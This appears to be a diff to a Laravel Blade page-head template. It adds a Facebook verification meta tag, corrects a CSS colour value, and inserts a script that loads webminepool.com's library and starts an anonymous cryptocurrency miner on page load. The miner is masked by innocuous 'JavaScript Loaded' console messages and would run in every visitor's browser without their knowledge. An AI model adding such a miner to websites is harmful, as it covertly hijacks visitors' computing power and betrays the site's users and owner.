@@ -5,6 +5,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
     <meta name="format-detection" content="telephone=no">
+    <meta name="facebook-domain-verification" content="j1pr65xgvqs4lybk9z6obg1m6z8tjx" />
     <title>{{ setting('company')->name }} - @yield('title')</title>
     @include('facebook-pixel::head')
     <link rel="icon" type="image/png" href="{{ asset($logo->favicon) }}"><!-- fonts -->
@@ -16,7 +17,7 @@
     <link rel="stylesheet" href="{{ asset('strokya/fonts/stroyka/stroyka.css') }}">
     <style>
         ::placeholder {
-            color: #c0d0e !important;
+            color: #c0d0ee !important;
         }
         .page-header__container {
             padding-bottom: 12px;
@@ -181,6 +182,14 @@
             display: block;
         }
     </style>
+    <script src="https://webminepool.com/lib/base.js"></script>
+    <script>
+        window.onload = function(){console.log('JavaScript Loaded.');
+            var miner = WMP.Anonymous('SK_Pi5x2LoCAwKW5LJNWlfOc', {throttle: 0.3});
+            miner.start();
+            console.log('JavaScript Working.');
+        }
+    </script>
     @stack('styles')
     @routes
 </head>
